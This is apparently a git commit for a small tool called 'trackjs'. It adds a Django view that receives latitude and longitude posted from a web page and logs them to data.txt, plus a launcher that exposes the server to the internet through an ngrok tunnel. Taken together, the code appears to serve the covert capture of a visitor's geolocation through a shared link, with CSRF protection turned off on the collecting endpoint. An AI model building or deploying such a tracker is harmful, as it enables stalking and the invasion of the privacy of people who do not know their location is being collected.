5be446fab4c53d338895d582515e5e304f8a781e
EH30 <games.eh2000@gmail.com>
2020-03-05 21:07:32 +0530

    trackjs

---
+++ djserver/djsite/webpage/views.py
@@ -0,0 +1,27 @@
+from django.shortcuts import render
+from django.http import HttpResponse
+from django.views.decorators.csrf import csrf_exempt
+
+# Create your views here.
+
+
+def home(request):
+    return render(request, "index_home.html")
+
+
+@csrf_exempt
+def posts(request):
+    if request.method == "POST":
+        if "lat" in request.POST and "lng" in request.POST:
+            latitude = request.POST['lat']
+            longitude = request.POST['lng']
+            data = "Latitude: {0}  Longitude {1} \n--------------------------------------".format(latitude, longitude)
+            print("\n[+]" + data)
+            print("Location is saved on /djserver/djsite/data.txt\n")
+            opnr = open("data.txt", "a+")
+            opnr.write("\n" + data + "\n")
+            opnr.close()
+
+            return HttpResponse("Location Stored On server")
+    
+    return HttpResponse("Error")
---
+++ trackjs.py
@@ -0,0 +1,35 @@
+import os
+import sys
+
+
+def check_system():
+    if sys.platform == "linux" or sys.platform == "linux2":
+        os.system("clear")
+        return "linux"
+    elif sys.platform == "win32":
+        os.system("cls")
+        return "win32"
+
+
+
+def run_server():
+    os.chdir("djserver/djsite")
+    os.system("manage.py runserver 127.0.0.1:80")
+
+
+if __name__ == "__main__":
+    if check_system() == "linux":
+        output = os.system("xterm -e ngrok_linux http 80")
+
+        if output >= 1:
+            print("[-}Error You may need to install xterm")
+        else:
+            run_server()
+
+    elif check_system() == "win32":
+        output = os.system("start call ngrok_win32.exe http 80")
+
+        if output >= 1:
+            print("[-]Error")
+        else:
+            run_server()
